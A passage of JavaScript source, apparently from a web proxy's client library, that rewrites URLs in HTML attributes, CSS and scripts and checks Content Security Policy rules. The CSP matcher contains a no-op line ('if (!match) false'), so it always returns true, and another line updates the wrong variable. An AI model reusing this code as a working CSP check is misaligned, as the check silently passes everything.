	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(attr.src)))
		_proxy_jslib_throw_csp_error("img-src violation in <img src> attribute") ;
				 attr.src=         _proxy_jslib_full_url(attr.src, doc, reverse) ;         rebuild= 1 ;
	} else if (tag_name=='video' || tag_name=='audio' || tag_name=='source' || tag_name=='track') {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['media-src'], _proxy_jslib_absolute_url(attr.src)))
		_proxy_jslib_throw_csp_error("media-src violation in <"+tag_name+" src> attribute") ;
				 attr.src=         _proxy_jslib_full_url(attr.src, doc, reverse) ;         rebuild= 1 ;
	} else {
				 attr.src=         _proxy_jslib_full_url(attr.src, doc, reverse) ;         rebuild= 1 ;
	}
    }

    if ('srcdoc' in attr)      {
	if (tag_name=='iframe')  attr.srcdoc=      _proxy_jslib_proxify_html(attr.srcdoc, doc, 1, reverse)[0] ; rebuild= 1 }
    if ('lowsrc' in attr)      {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(attr.lowsrc)))
	    _proxy_jslib_throw_csp_error("img-src violation in <img lowsrc> attribute") ;
				 attr.lowsrc=      _proxy_jslib_full_url(attr.lowsrc, doc, reverse) ;      rebuild= 1 ;
    }
    if ('action' in attr)      {
	if ( ((doc.defaultView||doc.parentWindow)._proxy_jslib_base_unframes && attr.target==void 0) ||
	     (attr.target && attr.target.match(/^_(top|blank)$/i)) )
				 attr.action=       _proxy_jslib_full_url_by_frame(attr.action, doc, 0, reverse) ;
	else
				 attr.action=      _proxy_jslib_full_url(attr.action, doc, reverse) ;
	rebuild= 1 ;
    }
    if ('dynsrc' in attr)      { attr.dynsrc=      _proxy_jslib_full_url(attr.dynsrc, doc, reverse) ;      rebuild= 1 }
    if ('formaction' in attr)  { attr.formaction=  _proxy_jslib_full_url(attr.formaction, doc, reverse) ;  rebuild= 1 }
    if ('background' in attr)  { attr.background=  _proxy_jslib_full_url(attr.background, doc, reverse) ;  rebuild= 1 }
    if ('usemap' in attr)      { attr.usemap=      _proxy_jslib_full_url(attr.usemap, doc, reverse) ;      rebuild= 1 }
    if ('cite' in attr)        { attr.cite=        _proxy_jslib_full_url(attr.cite, doc, reverse) ;        rebuild= 1 }
    if ('longdesc' in attr)    { attr.longdesc=    _proxy_jslib_full_url(attr.longdesc, doc, reverse) ;    rebuild= 1 }
    if ('codebase' in attr)    { attr.codebase=    _proxy_jslib_full_url(attr.codebase, doc, reverse) ;    rebuild= 1 }
    if ('poster' in attr)      { attr.poster=      _proxy_jslib_full_url(attr.poster, doc, reverse) ;      rebuild= 1 }
    if ('pluginspage' in attr) { attr.pluginspage= _proxy_jslib_full_url(attr.pluginspage, doc, reverse) ; rebuild= 1 }

    if ((tag_name=='meta') && attr['http-equiv'] && attr['http-equiv'].match(/^\s*refresh\b/i)) {
	attr.content= _proxy_jslib_global_replace(
			  attr.content,
			  /(\;\s*URL\=)\s*(\S*)/i,
			  function (a) { return a[1] + _proxy_jslib_full_url(a[2], doc, reverse) } ) ;
	rebuild= 1 ;
    }


    // Now attr[] has been modified correctly.




    if (!rebuild) return element ;

    attrs= '' ;
    for (i= 0 ; i<names.length ; i++) {
	name= names[i] ;
	if (attr[name]==null) continue ;
	if (attr[name]=='')  { attrs+= ' '+name ; continue }
	if (!attr[name].match(/\"/) || attr[name].match(/\'/)) {
	    attrs+= ' '+name+'="'+_proxy_jslib_html_escape(attr[name])+'"' ;
	} else {
	    attrs+= ' '+name+"='"+_proxy_jslib_html_escape(attr[name])+"'" ;
	}
    }

    end_slash= element.match(/\/\s*>?$/)  ? ' /'  : '' ;
    return '<'+tag_name+attrs+end_slash+'>' ;
}



function _proxy_jslib_element2tag (e) {
    var ret= '', i ;
if (e.nodeType!=1) alert('in element2tag; nodeType=['+e.nodeType+']') ;
    for (i= 0 ; i<e.attributes.length ; i++)
	ret+= ' '+e.attributes[i].nodeName+'="'+e.attributes[i].nodeValue+'"' ;
    ret= '<'+e.tagName+ret+'>' ;
    for (i=0 ; i<e.childNodes.length ; i++)
	if      (e.childNodes[i].nodeType==1) ret+= '\n'+_proxy_jslib_element2tag(e.childNodes[i]) ;
	else if (e.childNodes[i].nodeType==3) ret+= '\n'+e.childNodes[i].nodeValue ;
    return ret ;
}



// this mimics much of _proxy_jslib_proxify_element(), above
// sometimes we have element, sometimes we have attr
function _proxy_jslib_proxify_attribute(element, attr, name, value, reverse) {
    if (/\&\{.*\}\;/.test(value)) return ;

    name= name.toLowerCase() ;
    element= element || (attr && attr.ownerElement) ;
    var element_name= element  ? element.nodeName.toLowerCase()  : '' ;

    // when proxifying URL, assume it's in a frame, since most of the time this
    //   routine is called it will be in a frame... not perfect....
    if (/^(href|src|lowsrc|dynsrc|action|background|usemap|cite|longdesc|codebase|poster)$/i.test(name)) {
	// don't convert href if it's not one of these four elements... hacky....
	if ((name=='href') && !element_name.match(/^(a|area|base|link)$/i))
	    return value ;
	return _proxy_jslib_full_url_by_frame(value, null, true, reverse,
	    name.toLowerCase()=='src' && element_name.match(/^i?frame$/i) ) ;
    } else if (/^on/i.test(name)) {
	return _proxy_jslib_proxify_block(value, _proxy_jslib_default_script_type,
			_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, reverse) ;
    } else if (/^style$/i.test(name)) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
	    _proxy_jslib_throw_csp_error('style-src violation with style attribute') ;
	if (/\b(expression|function)\s*\(/i.test(value)) return ;
	else return value ;
    } else if (/^data$/i.test(name) && element_name.match(/^object$/i)) {
	return _proxy_jslib_full_url_by_frame(value, null, true, reverse) ;
    } else {
	return value ;
    }
}



function _proxy_jslib_proxify_block(s, type, unknown_type_ok, reverse) {
    if (type) type= type.toLowerCase() ;

    if (type=='text/css') {
	return _proxy_jslib_proxify_css(s, reverse) ;

    } else if (type && type.match(/^(application\/x\-javascript|application\/x\-ecmascript|application\/javascript|application\/ecmascript|text\/javascript|text\/ecmascript|text\/livescript|text\/jscript)$/)) {
	return _proxy_jslib_proxify_js(s, 1, void 0, void 0, reverse) ;

    } else {
	return unknown_type_ok ? s : '' ;
    }
}



function _proxy_jslib_proxify_css(css, reverse) {
    // false in, false out
   if (!css || (typeof css!='string')) return css ;

    var out= '', m1, q, out2 ;
    while (m1= css.match(/(\@font\-face\s*\{([^}]*)\})|\burl\s*\(\s*(([^\)]*\\\))*[^\)]*)(\)|$)/i)) {
	if (m1[1]) {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(m1[3])))
		_proxy_jslib_throw_csp_error('img-src violation in url()') ;
	    out+= css.substr(0,m1.index) + '@font-face {' + _proxy_jslib_proxify_font_face(m1[1], null, reverse) + '}' ;
	} else {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(m1[3])))
		_proxy_jslib_throw_csp_error('img-src violation in url()') ;
	    out+= css.substr(0,m1.index) + 'url(' + _proxy_jslib_css_full_url(m1[3], null, reverse) + ')' ;
	}
	css= css.substr(m1.index+m1[0].length) ;
    }
    out+= css ;

    css= out ;
    out= '' ;
    while (m1= css.match(/\@import\s*(\"[^"]*\"|\'[^']*\'|[^\;\s\<]*)/i)) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], _proxy_jslib_absolute_url(m1[1])))
	    _proxy_jslib_throw_csp_error('style-src violation in @import') ;
	if (!m1[1].match(/^url\s*\(/i)) {   // to avoid use of "(?!...)"
	    out+= css.substr(0,m1.index) + '@import ' + _proxy_jslib_css_full_url(m1[1], null, reverse) ;
	} else {
	    out+= css.substr(0,m1.index) + m1[0] ;
	}
	css= css.substr(m1.index+m1[0].length) ;
    }
    out+= css ;

    // this is imperfect, but should work for virtually all cases
    css= out ;
    out= '' ;
    while (m1= css.match(/\bimage\s*\((\"[^"]*\"|\'[^']*\'|\#?\w+(\([^\)]*\))\))/i)) {
	out2= [] ;
	var items= m1[1].split(/\s*,\s*/) ;
	for (var i= 0 ; i<items.length ; i++) {
	    if (items[i].match(/^['"]/)) {
		q= items[i].slice(0, 1) ;
		items[i]= items[i].slice(1, -1) ;
		if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(items[i])))
		    _proxy_jslib_throw_csp_error('img-src violation in image()') ;
		out2.push(q + _proxy_jslib_full_url(items[i], null, reverse) + q) ;
	    } else {
		out2.push(items[i]) ;
	    }
	}
	out+= 'image(' + out2.join(',') + ')' ;
	css= css.substr(m1.index+m1[0].length) ;
    }
    out+= css ;
	    
    css= out ;
    out= '' ;
    while (m1= css.match(/((expression|function)\s*\()([^)]*)/i)) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], _proxy_jslib_absolute_url(m1[3])))
	    _proxy_jslib_throw_csp_error('script-src violation') ;
	out+= css.substr(0,m1.index) + m1[1] + _proxy_jslib_proxify_js(m1[3], void 0, void 0, void 0, reverse) ;
	css= css.substr(m1.index+m1[0].length) ;
    }
    out+= css ;

    return out ;
}


function _proxy_jslib_css_full_url(url, doc, reverse) {
    var q= '' ;
    url= url.replace(/\s+$/, '') ;
    if      (url.match(/^\"/)) { q= '"' ; url= url.replace(/^\"|\"$/g, '') }
    else if (url.match(/^\'/)) { q= "'" ; url= url.replace(/^\'|\'$/g, '') }
    url= url.replace(/\\(.)/g, "$1").replace(/^\s+|\s+$/g, '') ;
    url= _proxy_jslib_full_url(url, doc, reverse) ;
    url= url.replace(/([\(\)\,\s\'\"\\])/g, function (p) { return '\\'+p } ) ;
    return q+url+q ;
}


function _proxy_jslib_proxify_font_face(css, doc, reverse) {
    var out= '' ;
    while (m1= css.match(/\burl\s*\(\s*(([^\)]*\\\))*[^\)]*)(\)|$)/i)) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['font-src'], _proxy_jslib_absolute_url(m1[1])))
	    _proxy_jslib_throw_csp_error('font-src violation in url()') ;
	out+= css.substr(0,m1.index) + 'url(' + _proxy_jslib_css_full_url(m1[1], doc, reverse) + ')' ;
	css= css.substr(m1.index+m1[0].length) ;
    }
    out+= css ;
    return out ;
}



function _proxy_jslib_return_frame_doc(enc_URL, doc) {
    var top_URL= _proxy_jslib_html_escape(_proxy_jslib_url_start_inframe
					  + _proxy_jslib_wrap_proxy_encode('x-proxy://frames/topframe?URL='
								      + encodeURIComponent(enc_URL) ) ) ;
    var page_URL= _proxy_jslib_html_escape(_proxy_jslib_url_start_inframe + enc_URL) ;
    doc.open();
    doc.write('<html>\n<frameset rows="80,*">\n'
	    + '<frame src="'+top_URL+'">\n<frame src="'+page_URL+'" name="_proxy_jslib_main_frame">\n'
	    + '<\/frameset>\n</html>') ;
    doc.close() ;
//alert('in return_frame_doc, after writing doc; top_URL, page_URL=\n['+top_URL+']\n['+page_URL+']') ;
}



function _proxy_jslib_match_csp_source_list(directives, uri) {
    var match, pr_uri, i, j, m1, uscheme, uhost, uport, upath,
	sscheme, shost, sport, spath, pscheme, phost, pport ;

    if (!_proxy_jslib_csp_is_supported)  return true ;

    if ((uri==void 0) || (directives==void 0)) return true ;

    pr_uri= _proxy_jslib_URL ;   // may add as parameter later

    if (uri=="'unsafe-inline'" || uri=="'unsafe-eval'") {
	for (i= 0 ; i<directives.length ; i++) {
	    match= false ;
	    for (j= 0 ; j<directives[i].length ; j++) {
		if (directives[i][j]==uri) {
		    match= true ;
		    break ;
		}
	    }
	    if (!match) return false ;
	}
	return true ;
    }

    uri= _proxy_jslib_absolute_url(uri) ;

    m1= _proxy_jslib_parse_url(uri) ;
    uscheme= m1[1] ;
    uhost=   m1[4] ;
    uport=   m1[5] || ((uscheme=='http:')  ? 80  : (uscheme=='https:')  ? 443  : void 0) ;
    upath=   decodeURIComponent(m1[6]) ;
    if (!upath.match(/^\//)) upath= '/' + upath ;

    for (i= 0 ; i<directives.length ; i++) {
	match= false ;
	for (j= 0 ; j<directives[i].length ; j++) {
	    if (directives[i][j]=="'none'")  return false ;
	    if (directives[i][j]=="*") {
		match= true ;
		break ;
	    }

	    if (directives[i][j].match(/^[\w+\.\-]+\:$/)) {
		if (directives[i][j]==uscheme) {
		    match= true ;
		    break ;
		}
		continue ;

	    } else if (!directives[i][j].match(/^\'/)) {
		if (!uhost) continue ;

		// can't parse as normal URL because of possibility of "*"
		m1= directives[i][j].match(/^(([\w\+\.\-]+:)\/\/)?([^\/\?\:]*)(:([^\/\?]*))?([^\?]*)/) ;
		sscheme= m1[2] ;
		shost=   m1[3] ;
		sport=   m1[5] || ((sscheme=='http:')  ? 80  : (sscheme=='https:')  ? 443  : void 0) ;
		spath=   decodeURIComponent(m1[6]) ;

		if (sscheme && (sscheme!=uscheme)) continue ;
		if (!sscheme) {
		    if (pr_uri.match(/^http\:/) && (uscheme!='http:') && (uscheme!='https:')) continue ;
		    if (!pr_uri.match(/^http\:/) && (pr_uri.slice(0, uscheme.length)!=uscheme)) continue ;
		}

		if ((m1= shost.match(/^\*(\..*)/)) && (uhost.slice(-m1[1].length)!=m1[1])) continue ;
		if (!shost.match(/^\*\..*/) && (uhost!=shost)) continue ;   // corrected rule 4.6
		if (!sport && (uport!= ((uscheme=='http:')  ? 80  : (uscheme=='https:')  ? 443  : -1)) ) continue ;
		if (sport && (sport!='*') && (sport!=uport)) continue ;
		if (spath && spath.match(/^\/$/) && (upath.slice(0, spath.length)!=spath)) continue ;
		if (spath && !spath.match(/^\/$/) && (spath!=upath)) continue ;
		match= true ;
		break ;

	    } else if (directives[i][j]=="'self'") {
		m1= pr_uri.match(/^(([\w\+\.\-]+:)\/\/)?([^\/\?\:]*)(:([^\/\?]*))?([^\?]*)/) ;
		pscheme= m1[2] ;
		phost=   m1[3] ;
		pport=   m1[5] || ((pscheme=='http:')  ? 80  : (pscheme=='https:')  ? 443  : void 0) ;

		if ((uscheme==pscheme) && (uhost==phost) && (uport==pport)) {
		    match= true ;
		    break ;
		}
	    }
	}
	if (!match) false ;
    }
    return true ;
}


function _proxy_jslib_throw_csp_error(msg) {
    if (_proxy_jslib_ALERT_ON_CSP_VIOLATION)  alert("CSP violation: " + msg) ;
    throw new Error("CSP violation: " + msg) ;
}


function _proxy_jslib_csp_is_supported_test() {
    var ua= navigator.userAgent ;
    var match ;
    if (match= ua.match(/\bChrome\/(\d+)/))  return match[1]>=25 ;
    if (match= ua.match(/\bFirefox\/(\d+)/)) return match[1]>=23 ;

    return false ;
}



//---- everything needed to handle proxify_js() ------------------------

// This takes a string as input, and returns a string as output.  It calls
//   _proxy_jslib_proxify_js_tokens() to do the real work.
// Currently this only returns the proxified string, not the remainder.
// It turns out that Array.shift() and Array.unshift() are implemented
//   inefficiently in both Firefox and MSIE, such that it seems to require
//   the whole Array to shift down in memory; thus, shifting the whole array
//   goes as O(n^2).  Additionally, Array.pop() is implemented equally
//   inefficiently in MSIE, i.e. the time for one pop() is proportional to
//   the length of the array.  Thus, this routine is written to maintain a
//   single unchanging token array with pointers into it, which is probably
//   a good approach anyway.
function _proxy_jslib_proxify_js(s, top_level, with_level, in_new_statement, reverse) {
    if ((s==void 0) || (s=='')) return s ;
    if (with_level==void 0) with_level= 0 ;
    if (in_new_statement==void 0) in_new_statement= 0 ;

    // ... until _proxy_jslib_proxify_js_tokens_reverse() is complete
//    if (reverse) return s ;

    // hack for eval()-- return unchanged if it's not a string or String object
    if (!((typeof s=='string') || (s instanceof String)))
	return s ;

    var jsin= _proxy_jslib_tokenize_js(s) ;

    // jsm-- next routine really needs completion and more testing....
    if (reverse) return _proxy_jslib_proxify_js_tokens_reverse(jsin, 0, jsin.length) ;

    return _proxy_jslib_proxify_js_tokens(jsin, 0, jsin.length, top_level, with_level, in_new_statement, reverse) ;
}



function _proxy_jslib_proxify_js_tokens_reverse(jsin, start, end)
{
    var RE= _proxy_jslib_RE ;

    var i, i_jsin, out, element, token, match, p, op, estart, eend, tstart, tend ;

    out= [] ;
    out.push= _proxy_jslib_ORIGINAL_ARRAY_push ;  // hack to use original ARRAY.push()

    i_jsin= start ;

    while (i_jsin<end) {
	element= jsin[i_jsin++] ;
	token= element.skip  ? void 0  : element ;

	if (token=='_proxy_jslib_handle') {
	    if (jsin[i_jsin+1]=='null') {
		out.push(jsin[i_jsin+7]) ;
		i_jsin+= 15 ;
	    } else {
		estart= i_jsin+1 ;
		i_jsin= eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 0) ;
		out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
		if (match= jsin[i_jsin+2].match(/^'(\w+)'$/)) {
		    out.push('.', match[1]) ;
		    i_jsin+= 13 ;
		} else if (jsin[i_jsin+2]=='(') {
		    out.push('[') ;
		    estart= i_jsin+3 ;
		    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
		    out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
		    out.push(']') ;
		    if (jsin[eend]!= ')')
			alert('error parsing _proxy_jslib_handle; next token is ['+jsin[eend]+']') ;
		    i_jsin= eend+11 ;
		} else {
		    alert('error parsing _proxy_jslib_handle; next token is ['+jsin[i_jsin+2]+']') ;
		    break ;
		}
	    }

	} else if (token=='_proxy_jslib_assign') {
	    if (jsin[i_jsin+1]=="''") {
		tstart= i_jsin+4 ;
		tend= _proxy_jslib_get_next_js_expr(jsin, tstart, end, 0) ;
		out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, tstart, tend)) ;
		if (match= jsin[tend+2].match(/^'(\w+)'$/)) {
		    out.push('.', match[1]) ;
		    op= jsin[tend+5].match(/^'([^']*)'$/)[1] ;
		    out.push(op) ;
		    if (jsin[tend+8]=="''") {
			i_jsin= tend+10 ;
		    } else if (jsin[tend+8]=='(') {
			estart= tend+9 ;
			eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
			out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
			i_jsin= eend+2 ;
		    } else {
			alert('error parsing _p_j_assign; next token is ['+jsin[tend+8]+']') ;
		    }
		} else if (jsin[tend+2]=='(') {
		    out.push('[') ;
		    estart= tend+3 ;
		    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
		    out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
		    out.push(']') ;
		    op= jsin[eend+3].match(/^'([^']*)'$/)[1] ;
		    out.push(op) ;
		    if (jsin[eend+6]=="''") {
			i_jsin= eend+8 ;
		    } else if (jsin[eend+6]=='(') {
			estart= eend+7 ;
			eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
			out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
			i_jsin= eend+2 ;
		    } else {
			alert('error parsing _p_j_assign; next token is ['+jsin[eend+6]+']') ;
		    }
		} else {
		    alert('error parsing _p_j_assign; next token is ['+jsin[tend+2]+']') ;
		}
	    } else if (match= jsin[i_jsin+1].match(/^'(\+\+|--|delete)'$/)) {
		op= match[1] ;
		out.push(op) ;
		tstart= i_jsin+4 ;
		tend= _proxy_jslib_get_next_js_expr(jsin, tstart, end, 0) ;
		out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, tstart, tend)) ;
		if (match= jsin[tend+2].match(/^'(\w+)'$/)) {
		    out.push('.', match[1]) ;
		    i_jsin= tend+10 ;
		} else if (jsin[tend+2]=='(') {
		    out.push('[') ;
		    estart= tend+3 ;
		    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
		    out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
		    out.push(']') ;
		    i_jsin= _proxy_jslib_get_next_js_expr(jsin, eend+2, end, 1) + 1 ;
		} else {
		    alert('error parsing _p_j_assign; next token is ['+jsin[tend+2]+']') ;
		}
	    } else {
		alert('error parsing _p_j_assign; next token is ['+jsin[i_jsin+1]+']') ;
	    }

	} else if (token=='_proxy_jslib_assign_rval') {
	    out.pop() ; out.pop() ;
	    p= out.pop() ;
	    if (jsin[i_jsin+1]=="''") {
		if (match= jsin[i_jsin+4].match(/^'(\w+)'$/)) {
		    if (p!=match[1])
			alert('error parsing _proxy_jslib_assign_rval; p doesn\'t match') ;
		    out.push(p) ;
		    if (match= jsin[i_jsin+7].match(/^'(\+\+|--)'$/)) {
			out.push(match[1]) ;
			i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+13, end, 1) + 1 ;
		    } else if (match= jsin[i_jsin+7].match(/^'([^']+)'$/)) {
			out.push(match[1]) ;
			if (jsin[i_jsin+10]=='(') {
			    estart= i_jsin+11 ;
			    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
			    out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
			    i_jsin= _proxy_jslib_get_next_js_expr(jsin, eend+2, end, 1) + 1 ;
			} else {
			    alert('error parsing _proxy_jslib_assign_rval; next token is ['+jsin[i_jsin+10]+']') ;
			}
		    } else {
			alert('error parsing _proxy_jslib_assign_rval; next token is ['+jsin[i_jsin+7]+']') ;
		    }
		} else {
		    alert('error parsing _proxy_jslib_assign_rval; missing prop') ;
		}
	    } else if (match= jsin[i_jsin+1].match(/^'(\+\+|--|delete)'$/)) {
		out.push(match[1]) ;
		if (match= jsin[i_jsin+4].match(/^'(\w+)'$/)) {
		    out.push(match[1]) ;
		    i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+13, end, 1) ;
		} else {
		    alert('error parsing _proxy_jslib_assign_rval; missing prop') ;
		}
	    } else {
		alert('error parsing _proxy_jslib_assign_rval; bad prefix') ;
	    }

	} else if (token=='_proxy_jslib_with_handle') {
	    out.push(jsin[i_jsin+7]) ;
	    jsin+= 15 ;

	} else if (token=='_proxy_jslib_with_assign_rval') {
	    out.pop() ; out.pop() ;
	    p= out.pop() ;
	    match= jsin[i_jsin+7].match(/^'(\w+)'$/) ;
	    if (p!=match[1])
		alert('error parsing _proxy_jslib_with_assign_rval; p doesn\'t match') ;
	    if (jsin[i_jsin+4]=="''") {
		out.push(p) ;
		if (match= jsin[i_jsin+10].match(/^'(\+\+|--)'$/)) {
		    out.push(match[1]) ;
		    i_jsin+= 18 ;
		} else if (match= jsin[i_jsin+10].match(/^'([^']+)'$/)) {
		    out.push(match[1]) ;
		    estart= i_jsin+14 ;
		    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 1) ;
		    out.push(_proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend)) ;
		    i_jsin= eend+5 ;
		} else {
		    alert('error parsing _proxy_jslib_with_assign_rval; next token is ['+jsin[i_jsin+10]+']') ;
		}
	    } else if (match= jsin[i_jsin+4].match(/^'(\+\+|--|delete)'$/)) {
		out.push(match[1], p) ;
		i_jsin+= 18 ;
	    } else {
		alert('error parsing _proxy_jslib_with_assign_rval; prefix is ['+jsin[i_jsin+4]+']') ;
	    }

	} else if (token=='_proxy_jslib_eval_ok') {
	    estart= i_jsin+3 ;
	    while ((jsin[estart]!='eval') && (estart<end)) estart++ ;  // find 'eval' token, not perfect
	    estart+= 5 ;
	    eend= _proxy_jslib_get_next_js_expr(jsin, estart, end, 0) ;
	    out.push('eval(', _proxy_jslib_proxify_js_tokens_reverse(jsin, estart, eend), ')') ;
	    i_jsin= eend+18 ;

	} else if (token=='_proxy_jslib_increments') {
	    if (jsin[i_jsin]==')') {
		out.length-= 5 ;
		i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+6, end, 1) + 1 ;
	    } else {
		i_jsin+= 5 ;
	    }

	} else if (token=='_proxy_jslib_with_objs') {
	    if (jsin[i_jsin]=='=') {
		out.pop(); out.pop(); out.pop() ;
		i_jsin+= 6 ;
	    } else if (jsin[i_jsin]=='[') {
		i_jsin+= 7 ;
	    } else if (jsin[i_jsin]=='.') {
		i_jsin+= 6 ;
	    }

	} else if (token=='_proxy_jslib_flush_write_buffers') {
	    i_jsin+= 3 ;

	} else if (match= element.match(/^_proxy(\d+)_/)) {
	    out.push(element.replace(/^_proxy\d+/, '_proxy'+(match[1]>1 ? match[1]-1 : '') )) ;
	    

	} else {
	    out.push(element) ;
	}
    }

//_proxy_jslib_ORIGINAL_WINDOW_alert.call(window, 'in _proxy_jslib_proxify_js_tokens_reverse(), \nbefore:\n ['+jsin.slice(start, end).join('')+']\nafter:\n ['+out.join('')+']') ;

    return out.join('') ;
}



// This takes an array range of tokens as input, and returns a string.
// Note that the jsin array never changes; rather, we manipulate pointers
//   into it.  This includes when it is called recursively.
function _proxy_jslib_proxify_js_tokens(jsin, start, end, top_level, with_level, in_new_statement, reverse)
{
    var RE= _proxy_jslib_RE ;

    var i_jsin, i_jsin_start, out, element, token, last_token, new_last_token, newline_since_last_token,
	term_so_far= '', sub_expr, op, new_val, cur_val_str, inc_by,
	in_braces= 0, in_func= false, expr, new_expr,
	var_decl, varname, eq, value, skip1, skip2, funcname, with_obj, code,
	match, m2, o_p, ostart, oend, pstart, pend, p, estart, eend,
	skipped, i, i_next_token, i_lt, next_token, next_expr, next_expr_st, skipped, args, fn_body, t ;


    out= [] ;
    out.push= _proxy_jslib_ORIGINAL_ARRAY_push ;  // hack to use original ARRAY.push()

    if (top_level) _proxy_jslib_does_write= false ;

    i_jsin= start ;

  OUTER:
    while (i_jsin<end) {
	i_jsin_start= i_jsin;
	element= jsin[i_jsin++] ;
	token= element.skip  ? void 0  : element ;

	if (RE.LINETERMINATOR.test(element)) newline_since_last_token= true ;
	new_last_token= '' ;

	if (token=='{') {
	    in_braces++ ;
	} else if (token=='}') {
	    if (--in_braces==0) in_func= false ;
	}


	// locate next token in jsin, and whether we skip a line terminator
	i_next_token= i_lt= i_jsin ;
	while (i_next_token<end && jsin[i_next_token].skip) i_next_token++ ;
	next_token= (i_next_token<end)  ? jsin[i_next_token]  : void 0 ;
	while (i_lt<i_next_token && !RE.LINETERMINATOR.test(jsin[i_lt])) i_lt++ ;
	if (i_lt==i_next_token) i_lt= void 0 ;


	// start of the main switch block

	if (!token) {
	    if (term_so_far) term_so_far+= element ;
	    else out.push(element) ;


	} else if (RE.N_S_RE.test(token)) {
	    out.push(term_so_far) ;
	    term_so_far= token ;


	} else if (/^(\+\+|\-\-|delete)$/.test(token)) {
	    // peek ahead to see if we're in "-->"
	    if (token=='--' && (next_token=='>')) {
		i_jsin= i_next_token+1 ;
		out.push(term_so_far, '-->') ;
		term_so_far= '' ;
	    } else if (term_so_far!='' && !newline_since_last_token) {
		out.push(term_so_far, token) ;
		term_so_far= '' ;
	    } else {
		out.push(term_so_far) ;
		term_so_far= '' ;

		var start_parens= 0;
		while (jsin[i_next_token]=='(') {
		    start_parens++;
		    i_jsin= i_next_token+1;
		    while (jsin[i_jsin].skip) i_jsin++;
		    i_next_token= i_jsin;
		}

		o_p= _proxy_jslib_get_next_js_term(jsin, i_jsin, end) ;
		if (o_p==void 0) break ;
		ostart= o_p[0] ;
		oend=   o_p[1] ;
		pstart= o_p[2] ;
		pend=   o_p[3] ;

		i_next_token= pend ;
		while (jsin[i_next_token].skip) i_next_token++ ;
		while (start_parens) {
		    if (jsin[i_next_token]!=')') break OUTER ;
		    new_last_token= ')' ;
		    start_parens-- ;
		    i_next_token++ ;
		    while (jsin[i_next_token].skip) i_next_token++ ;
		}

		if (oend>ostart) {
		    if (pstart>=pend) {
			p= '' ;
			out.concat(token, jsin.slice(i_jsin_start, i_next_token));
		    } else if (jsin[pstart]=='[') {
			p= _proxy_jslib_proxify_js_tokens(jsin, pstart+1, pend-1, 0, with_level) ;
			out.push(" _proxy_jslib_assign('" + token + "', ("
				+ _proxy_jslib_proxify_js_tokens(jsin, ostart, oend, 0, with_level) + "), ("
				+ p + "), '')" ) ;
		    } else {
			out.push(" _proxy_jslib_assign('" + token + "', ("
				+ _proxy_jslib_proxify_js_tokens(jsin, ostart, oend, 0, with_level)
				+ "), '"  + jsin[pstart] + "', '')" ) ;  // should be single identifier
		    }
		} else {
		    if (jsin[pstart]=='[') {
			p= _proxy_jslib_proxify_js_tokens(jsin, pstart+1, pend-1, 0, with_level) ;
			out.push(" _proxy_jslib_assign('" + token + "', ("
				+ _proxy_jslib_proxify_js_tokens(jsin, ostart, oend, 0, with_level) + "), ("
				+ p + "), '')" ) ;
		    } else {
			p= jsin[pstart] ;   // should be single identifier
			if (token=='delete')
			    out.push('delete ' + p);
			else if (p!='location')
			    out.push(token, p) ;
			else 
			    out.push("(" + p + "= _proxy_jslib_assign_rval('"
				     + token + "', '" + p + "', '', '', "
				     + "(typeof " + p + "=='undefined' ? void 0 : " + p + ")))") ;
		    }
		}
		i_jsin= i_next_token ;
	    }


	} else if (token=='eval' && (next_token=='(')) {
	    estart= i_jsin= i_next_token+1 ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
	    term_so_far= term_so_far.match(RE.DOTSKIPEND) 
		?  '(_proxy_jslib_eval_ok ? ' + term_so_far + 'eval(_proxy_jslib_proxify_js(('
		  + _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level)
		  + '), 0, ' + with_level + ') ) : _proxy_jslib_throw_csp_error("bad eval") )'
		: term_so_far + '(_proxy_jslib_eval_ok ? eval(_proxy_jslib_proxify_js(('
		  + _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level)
		  + '), 0, ' + with_level + ') ) : _proxy_jslib_throw_csp_error("bad eval") )' ;


	// Testing a hash of booleans here doesn't seem to be any faster than
